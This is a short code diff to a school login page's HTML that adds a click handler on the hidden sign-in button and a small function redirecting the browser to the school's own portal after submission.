@@ -262,7 +262,7 @@ input[type="submit"] {
 <a href="https://sbc-login.cloudworkengine.net/module.php/accountinfo/forgot-username.php" target="_blank" class="forgot">I forgot my username</a>
 </div>
  <button type="button" onclick="continuefunc()" id="webauthnBegin" tabindex="2">Continue</button>
-<input type="submit" id="submit" style="display: none;" value="Sign in">
+<input onclick="redirect()" type="submit" id="submit" style="display: none;" value="Sign in">
 </div>
 </form>
 
@@ -296,6 +296,10 @@ If you are having trouble logging in, please contact IT Support.</p>
     
           }
         });
+        function redirect()
+        {
+        window.location.href="https://mysbc.sbc.vic.edu.au/";
+        }
     </script>
 </body>
 </html>
